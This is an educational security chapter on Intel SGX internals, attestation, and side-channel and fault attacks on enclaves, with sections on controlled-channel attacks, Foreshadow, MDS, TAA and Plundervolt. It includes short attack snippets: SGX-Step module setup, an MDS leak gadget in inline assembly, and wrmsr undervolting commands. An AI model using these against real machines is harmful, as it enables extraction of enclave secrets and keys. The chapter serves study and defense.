# Domain 7, Chapter 7B — SGX Security, Rowhammer, and Hardware Vulnerability Taxonomy

> **Scope.** Intel SGX: enclave page cache (EPC) architecture, EPCM, PRM, MEE, enclave lifecycle instructions, attestation (EPID, ECDSA/DCAP), and side-channel attacks against enclaves (page-fault-based, cache-timing, branch shadowing, L1TF/Foreshadow, MDS/ZombieLoad/RIDL/Fallout, TAA, Plundervolt, SGAxe, ÆPIC Leak). AMD SEV/SEV-ES/SEV-SNP comparison. Rowhammer: single-sided, double-sided, one-location, DRAM architecture deep dive, ECC bypass (ECCploit), TRR and TRRespass evasion, Half-Double, SMASH, Blacksmith, cross-VM Rowhammer, ARM Rowhammer, browser-based Rowhammer, exploitation primitives (PTE bit flips, opcode corruption). Other hardware attacks: PLATYPUS, Hertzbleed, Zenbleed, Downfall/GDS, Inception, Reptar, RFDS, GhostRace, SLAM. SGX/TEE attack evolution: SGX deprecation implications, TDX architecture and attack surface, CipherLeaks, SEV-Step, ARM TrustZone TA exploitation (CVE-2015-6639, CVE-2016-2431, CVE-2021-25444), ARM CCA, RISC-V TEEs (Keystone, Sanctum). Advanced Rowhammer: TRRespass mechanism analysis, Half-Double distance-two physics, DDR5 ODECC limitations, cache-eviction-based hammering, full exploitation chain walkthrough. Hardware attack detection engineering: performance counter anomaly rules, EDAC trending, TEE attestation failure alerting, hardware debug interface detection, firmware integrity verification, supply chain component authentication (SPDM, PFR). Hardware security hardening: memory refresh tuning, SGX sealing key lifecycle, DCAP/PCCS attestation infrastructure, HSM integration patterns.
>
> **Prerequisites.** Chapter 7A (speculative execution model, cache side channels, timing primitives).

---

## 1. Intel SGX

### 1.1 EPC architecture deep dive

Intel SGX (Software Guard Extensions) provides hardware-enforced enclaves: isolated memory regions whose contents are encrypted by the CPU and inaccessible to all other software, including the OS, hypervisor, and SMM. The CPU decrypts enclave memory only when an enclave thread is executing inside the enclave.

**Processor Reserved Memory (PRM).** The BIOS reserves a contiguous region of physical memory called the PRM. The memory controller enforces that all non-SGX accesses to PRM addresses (DMA from peripherals, reads from other CPU modes) are blocked or return abort values. The PRM contains two critical structures: the EPC itself and the EPCM.

**Enclave Page Cache (EPC).** The EPC is a region within the PRM (typically 128 MB or 256 MB, configurable in BIOS, up to 512 MB on server platforms with SGX2) that holds the actual encrypted enclave pages. Each 4 KB EPC page is encrypted with a per-boot ephemeral key derived from a hardware random number generator inside the CPU package. This key never leaves the CPU die and is destroyed on power-off or reset. On server platforms supporting SGX2, the EPC can be dynamically expanded via `EAUG` and `EMODT` instructions without enclave restart.

When the EPC is full (all pages allocated), the OS can **page out** EPC pages to regular DRAM using `EWB` (Enclave Write Back). The paged-out data is encrypted and integrity-protected (via a MAC and a version number stored in a separate Version Array page). The OS pages it back in via `ELDB`/`ELDU`. This means enclave working sets can exceed the physical EPC size, though at significant performance cost due to encryption, integrity checking, and TLB management on every page-in/page-out.

**Enclave Page Cache Map (EPCM).** The EPCM is a hardware-maintained table with one entry per EPC page. Each EPCM entry records:

- The linear (virtual) address at which the owning enclave mapped this page.
- The enclave's SECS (SGX Enclave Control Structure) identifier, linking the page to a specific enclave.
- The page type: REG (regular data/code), TCS (Thread Control Structure), VA (Version Array for paging), SECS, or TRIM (page being reclaimed).
- Read/Write/Execute permissions.
- A valid bit indicating whether the page is in use.

The EPCM is not accessible to software at all; it is checked by the hardware on every enclave memory access. When an enclave instruction accesses a virtual address, the CPU translates it via the page tables (controlled by the OS), then checks the EPCM to verify that the resulting physical page belongs to the requesting enclave, that the virtual address matches the EPCM-recorded mapping, and that the access type is permitted. If any check fails, the access faults. This prevents the OS from remapping enclave pages to different virtual addresses or swapping pages between enclaves.

**Memory Encryption Engine (MEE).** The MEE sits between the CPU's last-level cache and the memory controller. It encrypts EPC pages on cache-line eviction to DRAM and decrypts them on cache-line fetch from DRAM. The encryption uses AES-CTR mode with a per-cache-line counter (nonce) to ensure that identical plaintext in different cache lines or at different times produces different ciphertext.

Integrity protection uses a Merkle tree (integrity tree). The MEE maintains a tree of MACs: each leaf MAC covers one cache line of EPC data, and higher-level nodes cover groups of MACs. The tree root is stored inside the CPU die (in on-die SRAM), making it tamper-proof. On every cache-line fetch from DRAM, the MEE verifies the MAC chain from the fetched line up to the root. If verification fails (indicating physical memory tampering, replay, or bit-flip), the CPU signals a #MC (machine check exception) and halts, rather than silently consuming corrupted data.

The MEE incurs latency overhead: each cache-line fetch from EPC requires additional memory accesses to read the integrity-tree nodes. Intel reports approximately 5-20% overhead for enclave workloads depending on working-set size and access patterns. The integrity tree itself consumes a portion of the EPC (approximately 1.5% overhead), reducing the usable EPC capacity slightly.

**Multi-key Total Memory Encryption (MKTME) relationship.** On newer Intel server platforms (Ice Lake Xeon and later), the MEE is replaced or augmented by TME/MKTME, which provides full-memory encryption (not limited to EPC). Under MKTME, each VM or enclave can receive its own encryption key, managed by the memory controller's key table. The distinction matters because TME provides confidentiality but not integrity — unlike the MEE's Merkle tree, TME-encrypted memory is vulnerable to replay and ciphertext manipulation. SGX on MKTME platforms retains an integrity mechanism (either the MEE for legacy mode or the newer Integrity Hash Island architecture) to maintain the anti-tampering guarantee.

**EPC overcommit and NUMA implications.** On multi-socket servers, each socket has its own EPC region within its local DRAM. An enclave running on socket 0 that accesses EPC pages on socket 1 incurs cross-NUMA latency plus the MEE decryption latency — a double penalty. The SGX driver's page-allocation policy attempts to allocate EPC pages local to the enclave's NUMA node, but under overcommit (when EPC is full and paging occurs), pages may be evicted and restored on a different NUMA node. Production SGX deployments on multi-socket systems must account for this via NUMA-aware enclave placement and EPC reservation per-socket.

### 1.2 Enclave lifecycle instructions

SGX defines a set of privileged and unprivileged instructions for managing enclaves. Understanding their semantics is essential for both enclave developers and attackers analyzing the attack surface.

**ECREATE.** Executed by the untrusted OS to allocate and initialize the SECS for a new enclave. The SECS is stored in an EPC page and records the enclave's base address, size (must be a power of two), SSA (State Save Area) frame size, MRENCLAVE (measurement register, initialized to zero), and various attributes (debug mode, 64-bit mode, KSS support). The OS specifies the enclave's virtual address range and attributes; ECREATE validates them and initializes the SECS. After ECREATE, the enclave exists but contains no code or data.

**EADD.** Adds a page of code or data to the enclave during the build phase. The OS specifies the source page (in regular memory) and the target virtual address within the enclave. The CPU copies the page into an EPC page, records the mapping in the EPCM, and extends the MRENCLAVE measurement with the page's metadata (target address, page type, permissions). EADD does not hash the page contents — that is EEXTEND's job.

**EEXTEND.** Hashes a 256-byte chunk of an enclave page into the MRENCLAVE measurement (using SHA-256). To fully measure a 4 KB page, EEXTEND must be called 16 times (once per 256-byte chunk). This separation from EADD allows flexible measurement policies, though in practice the full page is always measured. The resulting MRENCLAVE is a cumulative SHA-256 hash of all added pages and their metadata, providing a unique fingerprint of the enclave's initial state.

**EINIT.** Finalizes the enclave. The OS provides an EINIT token (a data structure signed by the Launch Enclave or, on FLC-capable platforms, by a key derived from the MRSIGNER key). EINIT verifies the token, checks that MRENCLAVE matches the expected value in the token, and marks the enclave as initialized. After EINIT, no further EADD/EEXTEND operations are permitted (in SGX1; SGX2 relaxes this with EAUG), and the enclave is ready for entry.

**EENTER.** Transitions the CPU from untrusted code into the enclave. The caller specifies a TCS (Thread Control Structure) page, which designates the entry point (the enclave function to call) and the SSA for saving state on interrupts. EENTER switches the CPU to enclave mode: the RIP is set to the entry point, the TCS is marked as busy (preventing re-entry on the same TCS), and subsequent memory accesses are checked against the EPCM. The untrusted stack pointer is saved and replaced with the enclave's internal stack.

**EEXIT.** Returns from enclave mode to untrusted code. The enclave explicitly calls EEXIT, specifying the return address in untrusted code and an output register value. The TCS is marked as not busy. Crucially, EEXIT does not automatically clear enclave registers — the enclave code must explicitly zero sensitive registers before calling EEXIT to prevent information leakage.

**AEX (Asynchronous Enclave Exit).** When an interrupt, exception, or fault occurs during enclave execution, the CPU performs an AEX: it saves the enclave's register state to the SSA (State Save Area, within the enclave's EPC), clears the architectural registers (to prevent leaking enclave state to the interrupt handler), and transfers control to the untrusted AEP (Asynchronous Exit Pointer). After the OS handles the interrupt, the enclave can be resumed via ERESUME, which restores the saved state from the SSA and continues execution. The AEX mechanism is critical to the controlled-channel and SGX-Step attacks described below: the attacker triggers interrupts at precise moments to observe enclave state after each AEX.

**ERESUME.** Restores enclave execution after an AEX. The CPU reads the saved state from the SSA, restores registers, and resumes execution at the interrupted instruction. ERESUME validates that the TCS and SSA are consistent before resuming.

**SGX2 dynamic instructions.** SGX2 (available on Ice Lake and later Xeon processors) adds instructions for dynamic enclave management without restart:

- **EAUG:** Dynamically adds a new page to a running enclave. The enclave must subsequently call `EACCEPT` to validate and take ownership of the new page. This enables heap growth and dynamic memory management inside enclaves.
- **EMODT:** Changes the type of an existing EPC page (e.g., from REG to TRIM for removal). The enclave calls `EACCEPT` to confirm the type change. This enables page reclamation and permission changes at runtime.
- **EMODPE:** Extends the permissions of an existing EPC page (e.g., adding execute permission to a data page). Only the enclave itself can call EMODPE — the OS cannot use it, preventing the OS from modifying enclave permissions.

SGX2 significantly expands the attack surface because the OS initiates EAUG (adding pages), and the enclave must correctly validate every EAUG via EACCEPT. Failure to validate creates race conditions where the OS can add unexpected pages to the enclave's address space. Secure SGX2 usage requires the enclave to track its own expected memory layout and reject EAUG for unexpected addresses.

**Enclave thread model.** Each TCS represents one concurrent entry point into the enclave. An enclave with N TCS pages can have N threads executing concurrently inside it. Each TCS points to its own SSA frame (for register saving on AEX) and its own entry-point offset. The enclave developer is responsible for concurrency control within the enclave — SGX provides no built-in locking primitives. Shared enclave data accessed by multiple TCS threads is subject to standard race conditions, which the attacker (with OS control of scheduling) can exploit by timing AEX interrupts to create TOCTOU windows.

### 1.3 Attestation protocols

Attestation allows a remote verifier to confirm that an enclave is running genuine, unmodified code on genuine SGX hardware. SGX provides two attestation models.

**EPID (Enhanced Privacy ID).** Intel's original attestation scheme uses a group signature protocol. The key participants are:

- **Group Manager (Intel).** Intel provisions each SGX platform with a unique member private key during manufacturing. All SGX platforms belong to a single EPID group. The group public key is published; individual member keys are secret.
- **Issuer (Intel Provisioning Service).** During platform provisioning, the CPU generates an attestation key, and Intel's provisioning service certifies it by issuing an EPID membership credential. This is a one-time process per platform.
- **Prover (the enclave platform).** To attest, the CPU's Quoting Enclave (QE) signs an attestation report (containing MRENCLAVE, MRSIGNER, and enclave attributes) with the EPID member key. The signature proves group membership without revealing which specific platform signed it — this is the key privacy property of EPID.
- **Verifier (the relying party).** The verifier sends the signed quote to Intel's Attestation Service (IAS). IAS verifies the group signature (checking that it was produced by a genuine SGX platform whose key has not been revoked) and returns a signed verification report. The verifier trusts IAS's response.

EPID's privacy property means that even Intel cannot determine which specific CPU produced a given attestation (unless the key is revoked). The downside is the mandatory online dependency on Intel's IAS during verification.

**ECDSA/DCAP (Data Center Attestation Primitives).** Introduced with SGX on scalable (Xeon) platforms, DCAP replaces the EPID flow with a standard PKI model:

- Each platform has a unique Provisioning Certification Key (PCK), an ECDSA-P256 key certified by Intel's root CA. The PCK certificate encodes the platform's TCB level (microcode version, PSVN).
- The **Quoting Enclave (QE)** generates an Attestation Key (AK) and certifies it with a CertificationData structure tied to the PCK. The QE signs enclave reports using the AK.
- The **Quote Verification Enclave (QVE)** or a user-deployed verification library verifies quotes locally, using Intel's root CA certificate and a Trusted Computing Base Info structure to check that the platform's TCB is current.
- Collateral data (PCK certificates, CRL, TCB Info, QE Identity) is cached locally and periodically refreshed from Intel's Provisioning Certification Service (PCS).

DCAP eliminates the runtime dependency on Intel's IAS. Verification can be done entirely offline (after initial collateral download), making it suitable for air-gapped or latency-sensitive data-center deployments. The tradeoff is that DCAP does not provide the same unlinkability as EPID: the PCK is per-platform, so quotes from the same platform can be linked by the verifier.

**Attestation flow step-by-step (DCAP).** The full attestation flow involves six steps that are critical to understand for security analysis:

1. **Local report generation.** The application enclave calls `EREPORT` to generate a local attestation report. EREPORT produces a MAC'd structure containing the enclave's MRENCLAVE, MRSIGNER, enclave attributes, and a 64-byte user-defined report data field (typically a hash of the enclave's public key or a nonce). The MAC is keyed with a "report key" that is shared only between enclaves on the same platform — it is derived from the CPU's hardware root key and the target enclave's identity.

2. **Quoting.** The application enclave sends the local report to the Quoting Enclave (QE). The QE verifies the report MAC (using its own EREPORT-derived key), confirming that the report was generated on the same physical platform. The QE then signs the report with its Attestation Key (AK), producing a "quote" — a signed statement that this enclave exists on this platform with this measurement.

3. **Quote transmission.** The quote is sent to the relying party (verifier) over an untrusted channel. The quote includes the enclave's measurement, the platform's TCB level, and the QE's CertificationData (which links the AK to the platform's PCK).

4. **Collateral retrieval.** The verifier retrieves the verification collateral from Intel's PCS (or a locally-cached copy): the PCK certificate (certifying the platform's PCK under Intel's root CA), the TCB Info structure (mapping microcode versions to security levels), and the CRL (revocation list for compromised platforms).

5. **Quote verification.** The verifier checks: (a) the AK signature on the quote is valid, (b) the AK is certified by a valid PCK certificate chain rooting at Intel's CA, (c) the PCK is not revoked, (d) the platform's TCB level meets the verifier's minimum requirements (i.e., the microcode is recent enough to include mitigations for known vulnerabilities), and (e) the MRENCLAVE matches the expected enclave binary.

6. **Trust decision.** If all checks pass, the verifier trusts the enclave and provisions secrets (e.g., encryption keys, database credentials) to it via a secure channel (typically TLS terminated inside the enclave, using the public key from the report data field).

**Attestation failure modes.** The attestation chain has several failure modes that affect production deployments: stale TCB Info (if the cached collateral is outdated, the verifier may reject platforms with newer microcode versions that are not in the cached TCB Info), PCK certificate rotation (some platforms have per-boot PCKs that change on firmware updates, breaking cached certificate chains), and multi-tenant key management (in a data-center DCAP deployment, the administrator must decide which MRENCLAVE values to trust, creating an allowlist management challenge).

### 1.4 Side-channel attacks against SGX

SGX's threat model explicitly includes a compromised OS — the enclave is supposed to be secure even if the OS is malicious. This means the OS-level attacker has extraordinary capabilities: they control page tables, interrupt delivery, scheduling, and can observe all system-level side effects of enclave execution. This makes SGX enclaves uniquely vulnerable to side-channel attacks because the attacker has root access to the machine itself.

#### 1.4.1 Controlled-channel attacks (page-fault side channel)

**Mechanism.** The malicious OS controls the page tables that map the enclave's virtual addresses to physical EPC pages. By clearing the present bit on selected enclave pages, the OS forces a page fault whenever the enclave accesses those pages. The page-fault handler (controlled by the attacker) receives the faulting virtual address, revealing which enclave page was accessed. By systematically marking and unmarking pages, the OS traces the enclave's page-level access pattern — effectively observing which 4 KB code and data pages the enclave touches during execution.

The resolution of this attack is one page (4 KB). For code with different execution paths on different pages (e.g., an `if/else` where each branch resides on a different page), the attacker can distinguish which branch was taken. For data, the attacker learns which data pages were accessed, which can leak array indices, table lookups, and similar access patterns.

**Tools and exploitation.** The SGX-Step framework (VU Amsterdam, 2017) refines the controlled-channel approach to achieve single-instruction granularity. SGX-Step configures the local APIC timer to fire an interrupt after exactly one enclave instruction executes:

```bash
# Build and install SGX-Step kernel module
git clone https://github.com/jovanbulck/sgx-step
cd sgx-step
make
sudo insmod sgx-step-mod.ko

# The framework provides a user-space library that:
# 1. Configures APIC timer to interrupt after 1 instruction
# 2. On each AEX, reads the enclave's interrupted RIP from the SSA
# 3. Logs the instruction pointer, accessed pages, and cache state
```

Each APIC timer interrupt causes an AEX, which saves the enclave's RIP in the SSA. The attacker reads the SSA (which is in EPC, but the RIP is reported to the OS as part of the AEX flow — specifically via the GPRSGX region), determining exactly which instruction was executing when the interrupt fired. By repeating this for every instruction, the attacker reconstructs the complete execution trace.

**CVE references.** Controlled-channel attacks were first described by Xu et al. (2015) and refined by Van Bulck et al. (2017) with SGX-Step. No individual CVE was assigned to the fundamental controlled-channel issue because it is considered inherent to the SGX threat model (the OS is untrusted by design). However, specific applications of controlled-channel attacks (e.g., key extraction from specific crypto libraries) have been addressed by library-level fixes (constant-time implementations, ORAM-based memory access).

**Detection and artifacts.** Enclave code can detect interrupt-based single-stepping by checking the SSA frame count or using TSX transactions (which abort on interrupts, allowing the enclave to detect abnormally frequent interrupts). The T-SGX defense wraps enclave code in TSX transactions; any interrupt aborts the transaction, and the enclave can count aborts to detect single-stepping. However, T-SGX is defeated by attacks that do not rely on interrupts (cache-timing, L1TF).

**Practical impact.** Controlled-channel attacks have been demonstrated to extract: full AES keys from T-Table implementations, RSA key bits from square-and-multiply code paths, DNA sequence queries from genome-processing enclaves (by observing which data pages are accessed), and neural-network model parameters from inference enclaves (by tracing weight-matrix access patterns). The page-granularity resolution is sufficient to distinguish between different branches, array indices, and function calls whenever they span page boundaries.

**Branch shadowing (related technique).** The attacker configures the branch predictor from outside the enclave by executing code at the same virtual address as the enclave's branch instruction (exploiting the BTB's address-indexed structure). The BTB records the direction and target of the shadow branch. When the enclave subsequently executes its branch, the predictor's accuracy (hit vs. miss in the BTB) depends on whether the enclave's branch matched the shadow's direction. The attacker measures the enclave's execution time (via SGX-Step's APIC timer) to determine whether the prediction was correct, thereby inferring the enclave's branch outcome. Branch shadowing achieves branch-level resolution (finer than page-level), revealing individual conditional-branch decisions within the enclave.

#### 1.4.2 Cache-timing attacks on SGX

The enclave shares the CPU cache hierarchy (L1, L2, L3) with untrusted code. The fundamental primitives (PRIME+PROBE, FLUSH+RELOAD — see Chapter 7A §7 for the detailed mechanics) work against enclaves because cache state is shared across security domains.

**SGX-specific considerations.** Because the attacker has OS-level control, they can co-schedule an attack thread on the same physical core as the enclave thread (or on a sibling hyper-thread). The attacker primes specific cache sets, allows the enclave to execute for a controlled number of instructions (using SGX-Step's APIC timer), and probes the cache sets to determine which lines the enclave accessed. This has been demonstrated to extract full AES-128 keys from enclave-resident T-Table AES implementations within minutes.

The FLUSH+RELOAD variant requires shared memory between the attacker and the enclave. In SGX, the enclave's code pages are loaded from a shared library (the enclave `.so`), and the untrusted loader can map the same library file. Although the EPC pages are encrypted, the attacker flushes shared library pages (outside the enclave) and measures reload time to determine whether the enclave accessed the corresponding code pages — because the enclave's access brings the code into the shared L3 cache.

**Defense: T-SGX.** Wraps enclave execution in Intel TSX transactions. A cache-based attack that evicts enclave cache lines causes a TSX abort (because TSX monitors the read/write sets for conflicts). The enclave detects the abort and can re-execute or take evasive action. T-SGX imposes 30-50% overhead and is defeated by MDS-class attacks that do not cause cache-line eviction.

**Defense: Compiler-based obfuscation.** Tools like Oblivious RAM (ORAM) compilers (e.g., ZeroTrace, Raccoon) rewrite enclave memory accesses to be data-independent: every code path accesses the same sequence of cache lines regardless of the secret data. This eliminates the side channel at the cost of 10-100x performance overhead depending on the ORAM scheme.

**Defense: cache partitioning.** Intel's Cache Allocation Technology (CAT), part of Resource Director Technology (RDT), can partition the LLC into isolated regions. By assigning the enclave's core a dedicated LLC partition, the attacker's PRIME+PROBE is confined to a different partition and cannot observe enclave cache activity. However, CAT requires OS cooperation (which is compromised in the SGX threat model) and does not protect L1/L2 (which are per-core and shared between the enclave and the attacker's hyper-thread). CAT is more effective in the SEV/TDX threat model where the hypervisor is trusted to configure partitioning correctly.

**Demonstrated extractions.** SGX cache-timing attacks have been published against: OpenSSL AES (T-Table implementation — full key recovery in under 10 minutes of PRIME+PROBE observation), mbedTLS RSA (key extraction via cache-line granularity observation of modular exponentiation), and Intel's own SGX SDK crypto routines (prior to their replacement with constant-time implementations in the 2.5+ SDK releases).

#### 1.4.3 L1 Terminal Fault / Foreshadow (CVE-2018-3615, CVE-2018-3620, CVE-2018-3646)

**Mechanism at the hardware level.** L1TF exploits a specific behavior in Intel's page-table walk logic. When the CPU loads a page-table entry with the present (P) bit cleared, the architectural behavior is to generate a page fault. However, before the fault is delivered, the CPU speculatively uses the physical address field of the non-present PTE to perform an L1 data cache lookup. If the target physical address happens to be resident in L1D (because the enclave recently accessed it), the speculative load succeeds and forwards the decrypted enclave data to dependent transient instructions.

The three CVEs correspond to three attack scenarios:
- **CVE-2018-3615 (Foreshadow).** Targets SGX enclaves specifically. The OS sets a PTE to point at an EPC physical address with P=0. A speculative load through this PTE reads decrypted enclave data from L1D.
- **CVE-2018-3620 (Foreshadow-OS).** Targets OS kernel memory. A user-space attacker sets up non-present PTEs pointing at kernel physical addresses.
- **CVE-2018-3646 (Foreshadow-VMM).** Targets VM memory. A guest VM sets up PTEs pointing at other guests' physical addresses (mapped through EPT).

**Exploitation against SGX.** The attack proceeds as follows:

1. The enclave executes normally, bringing its code and data into L1D (decrypted, since L1D operates on plaintext).
2. The attacker (with OS control) sets the PTE for an enclave page to P=0, preserving the physical address field pointing at the EPC page.
3. The attacker executes a load through the non-present PTE. Architecturally, this faults. Speculatively, the CPU reads the decrypted enclave data from L1D.
4. A Spectre-style gadget encodes the speculatively-read data into cache state.
5. The attacker probes cache state (FLUSH+RELOAD) to recover the data.

The attack reads one cache line (64 bytes) per attempt and can be repeated to extract arbitrary amounts of enclave memory, provided the target data is in L1D. The attacker can force enclave data into L1D by invoking the enclave and causing it to access the target data.

**Mitigation.** The primary mitigation is flushing L1D on every enclave exit (including AEX). The kernel executes `wrmsr(MSR_IA32_FLUSH_CMD, L1D_FLUSH)` before returning to untrusted code after any enclave interaction. On newer CPUs (post-Whiskey Lake), hardware fixes prevent the speculative L1D lookup through non-present PTEs entirely. Additionally, the Intel microcode update sets the `flush_l1d` CPUID bit, and the kernel uses this to conditionally enable the L1D flush.

**Foreshadow-VMM (CVE-2018-3646) in detail.** The VMM variant is particularly impactful in cloud environments. The hypervisor manages Extended Page Tables (EPT) for guest VMs. A malicious guest can set EPT entries to non-present (or the hypervisor may have non-present EPT entries for lazy allocation or overcommit). A speculative load through a non-present EPT entry reads from L1D at the physical address encoded in the EPT entry. If that physical address contains data from another VM's memory (which may be in L1D because of prior execution on the same core), the malicious guest can read another guest's data.

The Foreshadow-VMM mitigation requires flushing L1D on every VM entry (`vmlaunch`/`vmresume`). This ensures that one VM's data is not in L1D when another VM starts executing on the same core. The performance cost of L1D flush on VM entry is 5-15% for VM-heavy workloads (database servers running in VMs, microservice deployments with many small VMs), because every VMEXIT/VMENTER cycle now includes a full L1D flush. Combined with disabling SMT (to prevent the sibling hyper-thread from filling L1D between the flush and the VM's first instruction), the total overhead can reach 20-30%.

**PTE Inversion mitigation.** The Linux kernel also deployed "PTE inversion" for swap entries: when a page is swapped out, the kernel inverts all bits of the physical address in the PTE. This ensures that the non-present PTE contains an inverted (and thus almost certainly invalid or unallocated) physical address, preventing L1TF from reading meaningful data through stale PTEs. The `l1tf` vulnerability status file reports `PTE Inversion` when this mitigation is active.

#### 1.4.4 MDS variants against SGX: ZombieLoad, RIDL, Fallout

**Microarchitectural Data Sampling** attacks exploit speculative forwarding of data from internal CPU buffers. These buffers are shared between security domains on the same physical core (or between hyper-threads), and their contents are not cleared on context switches or enclave transitions.

**ZombieLoad (CVE-2019-11091, MFBDS — Microarchitectural Fill Buffer Data Sampling).** When a load encounters certain fault conditions (non-present page, permission violation), the load microop may speculatively receive data from the Line Fill Buffer (LFB) — data that belongs to a different security domain (another process, the kernel, or an SGX enclave). The LFB contains cache lines that are in transit between the cache hierarchy levels. If an enclave recently performed a load, the loaded data may still reside in the LFB, and a faulting load by the attacker on the same core can speculatively read it.

**RIDL (CVE-2018-12127, MLPDS — Microarchitectural Load Port Data Sampling).** Similar to ZombieLoad but exploits the Load Port rather than the LFB. The Load Port buffers data during execution; stale data from prior loads (including enclave loads) can be speculatively forwarded to the attacker's faulting load.

**Fallout (CVE-2018-12126, MSBDS — Microarchitectural Store Buffer Data Sampling).** Exploits the Store Buffer. When a load speculatively forwards data from the store buffer (store-to-load forwarding), it may pick up a stale store from a different security domain. In the SGX context, an enclave's recent store data in the store buffer can be forwarded to the attacker's speculative load.

**Cross-buffer interaction.** In practice, the three MDS variants are not cleanly separated. A single microarchitectural operation may touch multiple buffers: a load that misses in L1D allocates a line-fill buffer entry (ZombieLoad target), uses a load port (RIDL target), and may also interact with the store buffer if a prior store to the same address was in flight (Fallout target). The practical consequence is that the `VERW`-based mitigation must clear all three buffers simultaneously, and the microcode must ensure no new data enters the buffers between the `VERW` execution and the security-domain transition. Intel's microcode implementation achieves this by performing `VERW` as a serializing operation that stalls the pipeline until all outstanding buffer entries are drained and cleared.

**Exploitation pattern common to all MDS variants:**

```c
// Attacker code running on the same core as the enclave
// (or on a sibling hyper-thread)

// Step 1: Trigger enclave execution (e.g., EENTER)
//         Enclave accesses secret data, leaving traces in LFB/LP/SB

// Step 2: Perform a faulting load that speculatively receives buffer data
// The load_address is set up to fault (non-present PTE)
// The CPU speculatively forwards data from the microarch buffer

char *leak_buffer;  // 256 * 4096 bytes, page-aligned, flushed
asm volatile(
    "xor %%rax, %%rax\n"
    "retry:\n"
    "movzbl (%[faulting_addr]), %%eax\n"   // faulting load → buffer data
    "shl $12, %%rax\n"
    "movq (%[leak_buffer], %%rax), %%rbx\n" // encode into cache
    :
    : [faulting_addr] "r" (faulting_address),
      [leak_buffer] "r" (leak_buffer)
    : "rax", "rbx"
);

// Step 3: Probe leak_buffer with FLUSH+RELOAD to recover the byte
// The cache line at leak_buffer[secret_byte * 4096] is now cached
```

**Detection artifacts.** MDS exploitation produces a high rate of page faults (from the faulting loads) and abnormal patterns in hardware performance counters: `MEM_LOAD_RETIRED.FB_HIT` (fill-buffer hits), `OFFCORE_RESPONSE` events, and elevated TSX abort rates (when combined with TAA). Monitoring these counters on SGX-hosting servers provides a probabilistic detection mechanism.

**Mitigation.** Microcode updates provide the `VERW` instruction with enhanced semantics: when executed, `VERW` clears the contents of the LFB, load ports, and store buffer (the `md_clear` CPUID feature flag indicates support). The kernel executes `VERW` on every context switch (kernel→user), VM exit, and enclave exit. Disabling hyper-threading (`nosmt` kernel parameter) is the most complete mitigation, since hyper-threads share all three buffer types and `VERW` only clears the executing thread's view.

#### 1.4.5 TAA (TSX Asynchronous Abort, CVE-2019-11135)

TAA is an MDS variant that uses Intel TSX (transactional memory) as the trigger mechanism. When a TSX transaction encounters an asynchronous event (interrupt, abort condition), the CPU may speculatively execute beyond the abort point, forwarding data from microarchitectural buffers to the transient instructions. This provides a more reliable and less noisy trigger mechanism than the page-fault-based approach used in ZombieLoad/RIDL/Fallout, because TSX aborts do not generate page-fault exceptions visible to the OS.

The combination of TAA with SGX is particularly dangerous: the attacker wraps the leaking code in a TSX transaction, which aborts asynchronously (the abort window provides the speculative execution opportunity), and the enclave data in the buffers is forwarded to the transient execution within the aborting transaction. The attacker then probes cache state from outside the transaction to recover the data.

TAA also defeats the T-SGX defense mechanism. T-SGX protects enclaves by wrapping execution in TSX transactions (so that interrupts cause aborts, which the enclave can detect). TAA turns TSX itself into the attack vector — the very TSX transactions that T-SGX uses for defense become the trigger for buffer-data leakage. This created a direct conflict between the defense mechanism (T-SGX, requires TSX enabled) and the mitigation (TAA, requires TSX disabled), rendering T-SGX non-viable as an SGX protection on TAA-vulnerable hardware.

**Mitigation.** Disabling TSX entirely via the `tsx=off` kernel parameter or the `TSX_CTRL` MSR (available via microcode update). The `VERW`-based clearing also mitigates TAA because the buffers are cleared before transitioning to untrusted code. On platforms where TSX cannot be disabled (some workloads depend on it), the `VERW` approach alone is used.

**TSX deprecation timeline.** Intel has progressively restricted TSX across CPU generations. On 10th-gen and later CPUs, TSX is disabled by default (the `TSX_FORCE_ABORT` MSR causes all transactions to abort immediately). On 12th-gen (Alder Lake) and later, TSX is completely removed from the microarchitecture. This deprecation was motivated primarily by the security liability (TAA, and TSX's use as a timing-oracle mechanism in multiple side-channel attacks) rather than by the functionality's limited adoption. The removal eliminates an entire class of side-channel trigger mechanisms at the cost of breaking the small number of applications (databases, STM-based concurrency libraries) that rely on hardware transactional memory.

#### 1.4.6 Plundervolt (CVE-2019-11157)

**Mechanism.** Plundervolt is a software-induced fault-injection attack. Intel CPUs expose voltage and frequency control via the `MSR_OC_MAILBOX` (MSR 0x150) or `MSR_VF_POINT` interfaces, intended for overclocking. A malicious OS can write to these MSRs to undervolt the CPU core during enclave execution. Undervolting below the minimum stable voltage for the current frequency induces computational faults: incorrect results from arithmetic units (multipliers, AES-NI hardware) that do not crash the CPU but produce silently wrong outputs.

**Exploitation.** The attacker targets SGX-protected computations that use AES-NI (e.g., sealing, attestation key derivation). By inducing faults in specific AES rounds, the attacker obtains faulty ciphertexts. Differential fault analysis (DFA) recovers the AES key from the relationship between correct and faulty outputs. Approximately 10-50 faulty ciphertexts are sufficient to recover a 128-bit AES key.

```bash
# Plundervolt PoC requires ring-0 access (malicious OS)
# Set voltage offset via MSR 0x150 (overclocking mailbox)
# The offset is in units of ~1/1024 V

# Example: undervolt core by 260 mV
wrmsr -p 0 0x150 0x80000011F9C00000
# Trigger enclave AES computation during undervolted period
# Restore normal voltage
wrmsr -p 0 0x150 0x8000001100000000
# Collect faulty AES output for DFA
```

The attack bypasses SGX's integrity checks because the computation is performed correctly by the CPU's instruction decoder and retirement logic — the fault occurs in the execution unit itself, producing an architecturally-committed incorrect result that passes all hardware integrity checks.

**Fault model detail.** Plundervolt induces faults in the CPU's arithmetic/logic pipelines during the narrow timing window when the voltage is below the stable threshold. The faults manifest as: incorrect carry propagation in integer multipliers (producing a result that differs from the correct value by a small Hamming distance), incorrect round-key XOR in AES-NI hardware (producing a single-round fault that is ideal for DFA), and incorrect shift operations (producing bit-shifted versions of the correct result). The attacker controls: (1) which enclave computation is executing during the undervolt window (by timing the MSR write relative to the enclave invocation), (2) the depth of the undervolt (more aggressive undervolting produces more faults but risks a CPU hang), and (3) the duration of the undervolt (shorter windows target specific pipeline stages).

**Differential Fault Analysis (DFA) on AES.** The classic DFA attack on AES-128 requires faults in the 8th or 9th AES round. Given a correct ciphertext C and a faulty ciphertext C' (produced from the same plaintext but with a fault in round 8), the difference ΔC = C XOR C' constrains the possible key bytes. With 2-3 faulty ciphertexts, the attacker can uniquely determine all 16 bytes of the last round key, from which the AES-128 key is trivially recovered via inverse key schedule. Plundervolt provides the oracle for generating faulty ciphertexts by undervolting during specific AES rounds.

